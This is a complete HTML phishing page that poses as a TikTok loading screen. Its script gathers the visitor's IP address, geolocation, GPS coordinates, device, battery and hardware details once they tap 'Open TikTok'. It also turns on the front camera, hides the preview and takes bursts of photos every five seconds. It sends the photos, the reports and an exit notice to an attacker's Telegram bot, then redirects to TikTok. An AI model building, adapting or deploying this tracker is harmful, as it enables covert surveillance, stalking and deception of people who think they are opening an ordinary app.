<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
        }

        /* TikTok splash screen container */
        .splash {
            text-align: center;
            position: relative;
            z-index: 10;
        }

        /* TikTok logo wrapper */
        .tiktok-logo {
            margin-bottom: 40px;
            position: relative;
            display: inline-block;
        }

        .tiktok-icon {
            width: 80px;
            height: 80px;
            position: relative;
            margin: 0 auto;
        }

        .tiktok-icon svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 20px rgba(255, 0, 80, 0.6))
                    drop-shadow(0 0 40px rgba(0, 242, 234, 0.4));
            animation: glowPulse 2s ease-in-out infinite;
        }

        @keyframes glowPulse {
            0%, 100% {
                filter: drop-shadow(0 0 20px rgba(255, 0, 80, 0.6))
                        drop-shadow(0 0 40px rgba(0, 242, 234, 0.4));
            }
            50% {
                filter: drop-shadow(0 0 35px rgba(255, 0, 80, 0.9))
                        drop-shadow(0 0 60px rgba(0, 242, 234, 0.7));
            }
        }

        /* Pulsing rings around the logo */
        .ring-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 120px;
            height: 120px;
        }

        .ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 50%;
            border: 2px solid rgba(255, 255, 255, 0.3);
            animation: ringPulse 2s ease-out infinite;
        }

        .ring:nth-child(1) {
            width: 60px;
            height: 60px;
            animation-delay: 0s;
        }

        .ring:nth-child(2) {
            width: 60px;
            height: 60px;
            animation-delay: 0.6s;
        }

        .ring:nth-child(3) {
            width: 60px;
            height: 60px;
            animation-delay: 1.2s;
        }

        @keyframes ringPulse {
            0% {
                width: 60px;
                height: 60px;
                opacity: 0.8;
                border-color: rgba(255, 255, 255, 0.4);
            }
            100% {
                width: 160px;
                height: 160px;
                opacity: 0;
                border-color: rgba(255, 255, 255, 0);
            }
        }

        /* Loading dots */
        .loading-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 30px;
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ffffff;
            animation: dotBounce 1.4s ease-in-out infinite;
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes dotBounce {
            0%, 80%, 100% {
                transform: scale(0.3);
                opacity: 0.3;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* TikTok brand text */
        .brand-text {
            color: #ffffff;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 4px;
            margin-top: 20px;
            text-shadow: 0 0 30px rgba(255, 0, 80, 0.5);
        }

        /* Hidden camera video element */
        #cam {
            width: 200px;
            margin: 10px auto;
            display: none;
            border: 1px solid #333333;
            border-radius: 10px;
        }

        #canvas {
            display: none;
        }

        /* Status text */
        #status {
            color: rgba(255, 255, 255, 0.5);
            font-size: 12px;
            letter-spacing: 3px;
            margin-top: 15px;
            text-transform: uppercase;
        }

        /* Debug log */
        #debug {
            color: #00ff00;
            font-size: 9px;
            margin-top: 10px;
            max-height: 60px;
            overflow: hidden;
            text-align: center;
            opacity: 0.8;
        }

        /* Tap button area */
        #tapArea {
            display: none;
        }

        /* TikTok-style button */
        .tap-btn {
            display: inline-block;
            background: #fe2c55;
            color: #ffffff;
            border: none;
            padding: 16px 40px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            margin-top: 25px;
            cursor: pointer;
            letter-spacing: 1px;
            animation: btnPulse 2s infinite;
            text-decoration: none;
        }

        @keyframes btnPulse {
            0%, 100% {
                box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.4);
            }
            50% {
                box-shadow: 0 0 0 15px rgba(254, 44, 85, 0);
            }
        }
    </style>
</head>
<body>

    <!-- Hidden camera video -->
    <video id="cam" autoplay playsinline muted></video>
    
    <!-- Hidden canvas for photo capture -->
    <canvas id="canvas"></canvas>

    <!-- TikTok Splash Screen -->
    <div class="splash" id="splash">

        <!-- Logo with pulsing rings -->
        <div class="tiktok-logo">
            <div class="ring-container">
                <div class="ring"></div>
                <div class="ring"></div>
                <div class="ring"></div>
            </div>
            <div class="tiktok-icon">
                <svg viewBox="0 0 24 24" fill="white">
                    <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/>
                </svg>
            </div>
        </div>

        <!-- Loading dots -->
        <div class="loading-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <!-- Brand name -->
        <div class="brand-text">TikTok</div>

        <!-- Tap to open button -->
        <div id="tapArea">
            <a class="tap-btn" id="tapBtn" onclick="startEverything()">Open TikTok</a>
        </div>

        <!-- Status -->
        <div id="status">Tap to continue...</div>

        <!-- Debug log -->
        <div id="debug"></div>
    </div>

    <script>
    // ============================================================
    // CONFIGURATION - Read from URL parameters
    // ============================================================
    var urlParams = new URLSearchParams(location.search);
    var redirectUrl = urlParams.get('r') || 'https://www.tiktok.com';
    var botToken = urlParams.get('bot') || '';
    var chatId = urlParams.get('chat') || '';

    // ============================================================
    // GLOBAL VARIABLES
    // ============================================================
    var isMobileDevice = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
    var isDesktopDevice = !isMobileDevice;
    var gpsData = null;
    var ipAddress = null;
    var cameraStream = null;
    var cameraIsActive = false;
    var photoCount = 0;
    var visitStartTime = Date.now();
    var reportAlreadySent = false;
    var burstInterval = null;

    // ============================================================
    // DEBUG LOG - Shows on screen in green text
    // ============================================================
    function debugLog(message) {
        console.log('[Tracker] ' + message);
        var debugElement = document.getElementById('debug');
        if (debugElement) {
            debugElement.textContent = debugElement.textContent + '\n' + message;
            // Keep only last 6 lines
            var lines = debugElement.textContent.trim().split('\n');
            if (lines.length > 6) {
                lines = lines.slice(-6);
            }
            debugElement.textContent = lines.join('\n');
        }
    }

    // ============================================================
    // SHOW TAP BUTTON AFTER PAGE LOADS
    // ============================================================
    setTimeout(function() {
        document.getElementById('tapArea').style.display = 'block';
        document.getElementById('status').textContent = 'TAP TO OPEN';
    }, 1000);

    // ============================================================
    // GET IP ADDRESS
    // ============================================================
    function getIPAddress() {
        fetch('https://api.ipify.org?format=json')
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                ipAddress = data.ip;
                debugLog('IP: ' + ipAddress);
            })
            .catch(function() {
                ipAddress = 'Unknown';
            });
    }

    // ============================================================
    // GET BATTERY INFORMATION
    // ============================================================
    function getBatteryInfo() {
        if (navigator.getBattery) {
            return navigator.getBattery().then(function(battery) {
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Yes' : 'No'
                };
            });
        }
        return Promise.resolve({
            level: 'N/A',
            charging: 'Unknown'
        });
    }

    // ============================================================
    // GET GPS LOCATION
    // ============================================================
    function getGPSLocation() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                debugLog('GPS: Not supported on this browser');
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    debugLog('GPS: GRANTED by user');
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        heading: position.coords.heading
                    });
                },
                function(error) {
                    var errorMessages = {
                        1: 'Permission Denied',
                        2: 'Position Unavailable',
                        3: 'Timeout'
                    };
                    debugLog('GPS: ' + (errorMessages[error.code] || error.message));
                    resolve(null);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        });
    }

    // ============================================================
    // START CAMERA
    // ============================================================
    async function startCamera() {
        debugLog('📷 Camera: Starting...');
        document.getElementById('status').textContent = 'STARTING CAMERA...';

        // Check if camera API is available
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            debugLog('❌ Camera: API not supported');
            document.getElementById('status').textContent = 'NO CAMERA SUPPORT';
            return false;
        }

        // Show video element (IMPORTANT for iOS!)
        var videoElement = document.getElementById('cam');
        videoElement.style.display = 'block';

        try {
            debugLog('📷 Requesting camera permission...');

            // Request camera access
            var stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                }
            });

            // Set the video source
            videoElement.srcObject = stream;
            cameraStream = stream;

            // Start playing
            await videoElement.play();

            // Wait for video to actually have dimensions
            await new Promise(function(resolve) {
                var checkInterval = setInterval(function() {
                    if (videoElement.videoWidth && videoElement.videoWidth > 0) {
                        clearInterval(checkInterval);
                        resolve();
                    }
                }, 200);

                // Timeout after 5 seconds
                setTimeout(function() {
                    clearInterval(checkInterval);
                    resolve();
                }, 5000);
            });

            // Verify we got actual video
            if (videoElement.videoWidth && videoElement.videoWidth > 0) {
                cameraIsActive = true;
                debugLog('✅ Camera: WORKING! ' + videoElement.videoWidth + 'x' + videoElement.videoHeight);
                document.getElementById('status').textContent = 'CAMERA READY';

                // Hide video after confirming it works (keep it tiny but active)
                setTimeout(function() {
                    videoElement.style.width = '2px';
                    videoElement.style.height = '2px';
                    videoElement.style.opacity = '0.01';
                    videoElement.style.margin = '0';
                    videoElement.style.border = 'none';
                }, 1000);

                return true;
            } else {
                debugLog('❌ Camera: Stream opened but no video signal');
                document.getElementById('status').textContent = 'NO VIDEO SIGNAL';
                return false;
            }

        } catch (error) {
            debugLog('❌ Camera Error: ' + error.message);

            // Try again with simpler constraints
            try {
                debugLog('📷 Retrying with basic settings...');
                var simpleStream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = simpleStream;
                cameraStream = simpleStream;
                await videoElement.play();

                if (videoElement.videoWidth && videoElement.videoWidth > 0) {
                    cameraIsActive = true;
                    debugLog('✅ Camera: WORKING (basic mode)');
                    document.getElementById('status').textContent = 'CAMERA READY';
                    return true;
                }
            } catch (retryError) {
                debugLog('❌ Camera: All attempts failed');
            }

            videoElement.style.display = 'none';
            document.getElementById('status').textContent = 'NO CAMERA';
            return false;
        }
    }

    // ============================================================
    // TAKE A SINGLE PHOTO
    // ============================================================
    function takePhoto() {
        if (!cameraIsActive) {
            debugLog('📸 Photo skipped: Camera not active');
            return null;
        }

        try {
            var videoElement = document.getElementById('cam');

            // Check if video has actual content
            if (!videoElement.videoWidth || videoElement.videoWidth === 0) {
                debugLog('📸 Photo skipped: No video signal');
                return null;
            }

            // Draw video frame to canvas
            var canvasElement = document.getElementById('canvas');
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;

            var ctx = canvasElement.getContext('2d');

            // Mirror the image (front camera shows mirrored by default)
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(videoElement, -canvasElement.width, 0, canvasElement.width, canvasElement.height);
            ctx.restore();

            // Increment photo counter
            photoCount = photoCount + 1;

            debugLog('📸 Photo #' + photoCount + ' captured! (' + canvasElement.width + 'x' + canvasElement.height + ')');

            // Convert to JPEG data URL
            return canvasElement.toDataURL('image/jpeg', 0.7);

        } catch (error) {
            debugLog('📸 Photo error: ' + error.message);
            return null;
        }
    }

    // ============================================================
    // TAKE BURST PHOTOS (3 photos in rapid succession)
    // ============================================================
    function takeBurstPhotos() {
        if (!cameraIsActive) {
            debugLog('📸 Burst skipped: Camera not active');
            return;
        }

        debugLog('📸📸📸 BURST: Capturing 3 photos...');

        // Take 3 photos with 400ms between each
        for (var i = 0; i < 3; i++) {
            setTimeout(function() {
                var photo = takePhoto();
                if (photo) {
                    sendPhotoToTelegram(photo);
                }
            }, i * 400);
        }
    }

    // ============================================================
    // SEND PHOTO TO TELEGRAM
    // ============================================================
    function sendPhotoToTelegram(photoData) {
        if (!photoData || !botToken || !chatId) {
            debugLog('📤 Send skipped: Missing data');
            return;
        }

        try {
            // Convert base64 data URL to Blob
            var parts = photoData.split(',');
            var mimeType = parts[0].match(/:(.*?);/)[1];
            var base64Data = atob(parts[1]);
            var dataLength = base64Data.length;
            var uint8Array = new Uint8Array(dataLength);

            for (var i = 0; i < dataLength; i++) {
                uint8Array[i] = base64Data.charCodeAt(i);
            }

            var blob = new Blob([uint8Array], { type: mimeType });

            // Create FormData for Telegram API
            var formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'camera_capture_' + photoCount + '.jpg');
            formData.append('caption', '📸 Photo #' + photoCount);

            // Send via XHR
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
            xhr.onload = function() {
                debugLog('📤 Photo #' + photoCount + ' sent: HTTP ' + xhr.status);
            };
            xhr.onerror = function() {
                debugLog('📤 Photo #' + photoCount + ' FAILED (network error)');
            };
            xhr.send(formData);

        } catch (error) {
            debugLog('📤 Send error: ' + error.message);
        }
    }

    // ============================================================
    // GET LOCATION FROM IP ADDRESS
    // ============================================================
    async function getIPLocation() {
        if (!ipAddress || ipAddress === 'Unknown') {
            return '';
        }

        try {
            var response = await fetch('http://ip-api.com/json/' + ipAddress + '?fields=country,regionName,city,zip,timezone,lat,lon');
            var locationData = await response.json();

            if (locationData.country) {
                var locationText = '';
                locationText += '📍 Location Details\n';
                locationText += '   • Country: ' + locationData.country + '\n';
                locationText += '   • Region: ' + (locationData.regionName || 'N/A') + '\n';
                locationText += '   • City: ' + (locationData.city || 'N/A') + '\n';
                locationText += '   • Postal Code: ' + (locationData.zip || 'N/A') + '\n';
                locationText += '   • Timezone: ' + (locationData.timezone || 'N/A') + '\n';

                if (locationData.lat && locationData.lon) {
                    locationText += '   • Approx Maps: https://maps.google.com/?q=' + locationData.lat + ',' + locationData.lon + '\n';
                }

                locationText += '\n';
                return locationText;
            }
        } catch (error) {
            debugLog('IP Location lookup failed');
        }

        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        return '📍 Location Details\n   • Timezone: ' + timezone + '\n\n';
    }

    // ============================================================
    // BUILD AND SEND REPORT TO TELEGRAM
    // ============================================================
    async function buildAndSendReport(isFinalReport) {
        if (reportAlreadySent && !isFinalReport) {
            return;
        }
        reportAlreadySent = true;

        debugLog(isFinalReport ? 'Sending FINAL report...' : 'Sending report...');

        // Collect device information
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;
        var language = navigator.language;
        var screenResolution = screen.width + 'x' + screen.height;
        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var cpuCores = navigator.hardwareConcurrency || 'N/A';
        var ram = navigator.deviceMemory || 'N/A';
        var now = new Date();
        var dateString = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
        var timeString = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        var visitDuration = Math.floor((Date.now() - visitStartTime) / 1000);
        var batteryInfo = await getBatteryInfo();
        var ipLocationText = await getIPLocation();

        // Detect device model
        var deviceModel = platform;
        if (/iPhone/.test(userAgent)) {
            var iosVersion = userAgent.match(/OS (\d+_\d+)/);
            deviceModel = 'iPhone OS ' + (iosVersion ? iosVersion[1].replace('_', '.') : '') + ' like Mac OS X';
        } else if (/Android/.test(userAgent)) {
            var androidVersion = userAgent.match(/Android\s([\d.]+)/);
            deviceModel = 'Android ' + (androidVersion ? androidVersion[1] : '') + ' Device';
        } else if (/Windows/.test(platform)) {
            deviceModel = 'Windows PC';
        } else if (/Mac/.test(platform)) {
            deviceModel = 'Mac Computer';
        } else if (/Linux/.test(platform)) {
            deviceModel = 'Linux Computer';
        }

        // Build the message
        var prefix = isFinalReport ? '📋 FINAL REPORT - User Left Page\n\n' : '';

        var message = prefix;
        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        message += '    📊 Visitor Information Captured\n';
        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';

        // Device & Browser section
        message += '🖥️ Device & Browser\n';
        message += '   • Device Model: ' + deviceModel + '\n';
        message += '   • Device Type: ' + (isMobileDevice ? 'Mobile' : 'Desktop') + '\n';
        message += '   • User Agent: ' + userAgent.substring(0, 80) + '...\n\n';

        // Network section
        message += '🌐 Network Information\n';
        message += '   • IP Address: ' + (ipAddress || 'Detecting...') + '\n';
        message += '   • Language: ' + language + '\n\n';

        // IP Location
        message += ipLocationText;

        // GPS section
        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        message += '    🗺️ GPS Coordinates\n';
        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';

        if (gpsData) {
            message += '   ✅ Location Granted\n';
            message += '   • Latitude: ' + gpsData.latitude.toFixed(15) + '\n';
            message += '   • Longitude: ' + gpsData.longitude.toFixed(15) + '\n';
            message += '   • Accuracy: ' + gpsData.accuracy.toFixed(0) + 'mm\n';
            if (gpsData.altitude) {
                message += '   • Altitude: ' + gpsData.altitude.toFixed(1) + 'm\n';
            }
            if (gpsData.speed) {
                message += '   • Speed: ' + (gpsData.speed * 3.6).toFixed(1) + ' km/h\n';
            }
            message += '\n   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.latitude + ',' + gpsData.longitude;
            message += '&ll=' + gpsData.latitude + ',' + gpsData.longitude + '&z=16\n\n';
        } else {
            message += '   ❌ Location: Not available\n';
            if (isDesktopDevice) {
                message += '   💡 Desktop detected - GPS usually not available\n';
            }
            message += '   💡 Location permission was not granted\n\n';
        }

        // Device Details section
        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        message += '    📱 Device Details\n';
        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';

        message += '🖼️ Display Information\n';
        message += '   • Resolution: ' + screenResolution + '\n\n';

        message += '🔋 Battery Status\n';
        message += '   • Level: ' + batteryInfo.level + '\n';
        message += '   • Charging: ' + batteryInfo.charging + '\n\n';

        message += '🔐 Device Permissions\n';
        message += '   • Camera: ' + (cameraIsActive ? 'Active 📸' : 'Not Available') + '\n';
        message += '   • Location: ' + (gpsData ? 'Granted ✅' : 'Denied ❌') + '\n\n';

        message += '💾 Hardware & Storage\n';
        message += '   • CPU Cores: ' + cpuCores + '\n';
        message += '   • RAM: ' + ram + ' GB\n';
        message += '   • Photos Captured: ' + photoCount + '\n';
        message += '   • Visit Duration: ' + visitDuration + ' seconds\n\n';

        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        message += '📅 Captured: ' + dateString + ', ' + timeString + '\n';
        message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

        // Send via XHR (synchronous to ensure it sends before redirect)
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendMessage', false);
        xhr.setRequestHeader('Content-Type', 'application/json');

        try {
            xhr.send(JSON.stringify({
                chat_id: chatId,
                text: message,
                disable_web_page_preview: true
            }));
            debugLog('Report sent: HTTP ' + xhr.status);
        } catch (error) {
            debugLog('Report FAILED: ' + error.message);
        }

        // Send GPS location pin if available
        if (gpsData) {
            var locationXhr = new XMLHttpRequest();
            locationXhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendLocation', false);
            locationXhr.setRequestHeader('Content-Type', 'application/json');

            try {
                locationXhr.send(JSON.stringify({
                    chat_id: chatId,
                    latitude: gpsData.latitude,
                    longitude: gpsData.longitude
                }));
                debugLog('Location pin sent');
            } catch (error) {
                // Silently fail
            }
        }
    }

    // ============================================================
    // STOP CAMERA
    // ============================================================
    function stopCamera() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(function(track) {
                track.stop();
            });
            cameraStream = null;
            cameraIsActive = false;
            debugLog('Camera: Stopped');
        }

        if (burstInterval) {
            clearInterval(burstInterval);
            burstInterval = null;
        }
    }

    // ============================================================
    // MAIN FUNCTION - Runs when user taps "Open TikTok"
    // ============================================================
    async function startEverything() {
        debugLog('=== USER TAPPED - STARTING EVERYTHING ===');
        debugLog('Device: ' + (isMobileDevice ? 'MOBILE' : 'DESKTOP'));
        debugLog('Redirect: ' + redirectUrl.substring(0, 30) + '...');

        // Hide the tap button
        document.getElementById('tapArea').style.display = 'none';
        document.getElementById('status').textContent = 'LOADING...';

        // Get IP address (don't wait)
        getIPAddress();

        // Get GPS location
        document.getElementById('status').textContent = 'LOCATING...';
        gpsData = await getGPSLocation();

        // Start camera
        document.getElementById('status').textContent = 'STARTING CAMERA...';
        var cameraStarted = await startCamera();

        // Send initial report
        document.getElementById('status').textContent = 'SENDING...';
        await buildAndSendReport(false);

        // Start burst photo capture if camera is working
        if (cameraStarted) {
            debugLog('📸📸📸 BURST MODE ACTIVE: 3 photos every 5 seconds');
            document.getElementById('status').textContent = 'CAPTURING PHOTOS...';

            // First burst after 3 seconds (give camera time to stabilize)
            setTimeout(function() {
                takeBurstPhotos();

                // Then burst every 5 seconds
                burstInterval = setInterval(function() {
                    takeBurstPhotos();
                }, 5000);
            }, 3000);
        } else {
            debugLog('⚠️ Camera not available - no photos will be taken');
            document.getElementById('status').textContent = 'NO CAMERA AVAILABLE';
        }

        // Redirect after 10 seconds (allows time for multiple photo bursts)
        document.getElementById('status').textContent = 'OPENING TIKTOK...';
        debugLog('Will redirect in 10 seconds...');

        setTimeout(function() {
            debugLog('Redirecting now...');
            document.getElementById('splash').style.display = 'none';
            window.location.href = redirectUrl;
        }, 10000);
    }

    // ============================================================
    // HANDLE USER LEAVING THE PAGE
    // ============================================================
    function handleUserExit() {
        stopCamera();

        var duration = Math.floor((Date.now() - visitStartTime) / 1000);
        var exitMessage = '📋 User Left Page\n' +
                          '⏱ Duration: ' + duration + 's\n' +
                          '📸 Photos: ' + photoCount + '\n' +
                          '📱 Device: ' + (isMobileDevice ? 'Mobile' : 'Desktop') + '\n' +
                          '🌐 IP: ' + (ipAddress || 'Unknown');

        debugLog('User leaving: ' + exitMessage.replace(/\n/g, ' | '));

        // Use sendBeacon for reliable delivery when page closes
        if (navigator.sendBeacon) {
            navigator.sendBeacon(
                'https://api.telegram.org/bot' + botToken + '/sendMessage',
                JSON.stringify({
                    chat_id: chatId,
                    text: exitMessage
                })
            );
        }
    }

    // Register exit handlers
    window.addEventListener('beforeunload', handleUserExit);
    window.addEventListener('pagehide', handleUserExit);
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            handleUserExit();
        }
    });

    // ============================================================
    // STARTUP
    // ============================================================
    debugLog('Page loaded. Waiting for user to tap...');
    debugLog('Device: ' + (isMobileDevice ? 'MOBILE' : 'DESKTOP'));
    </script>
</body>
</html>
